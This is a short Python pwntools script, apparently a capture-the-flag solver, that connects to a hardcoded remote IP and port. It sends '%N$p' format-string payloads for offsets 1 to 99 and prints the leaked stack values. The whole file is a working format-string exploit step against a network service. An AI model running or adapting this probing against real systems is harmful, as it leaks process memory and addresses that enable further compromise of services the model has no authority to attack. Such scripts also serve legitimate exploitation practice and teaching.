# "gojek" way of finding the format string leak offset

from pwn import *

from time import sleep

# HOST = 'localhost'
# PORT = 1337
HOST = '107.191.51.129'
PORT = 5001

MAX_OFFSET = 100


def leak_string(offset):
    context.log_level = 'error'

    io = remote(HOST, PORT)

    io.sendline(f'%{offset}$p')

    try:
        io.recvline()
        data = io.recvline()
        print(data)
        return data.decode()
    except UnicodeDecodeError:
        return None
    finally:
        context.log_level = 'INFO'
        io.close()




with log.progress('Leaking') as p:
    for offset in range(1, MAX_OFFSET):
        sleep(0.05)  # Let's not flood the server
        p.status(f'{(offset / MAX_OFFSET) * 100: .2f}%')
        print(offset)
        leak_string(offset)
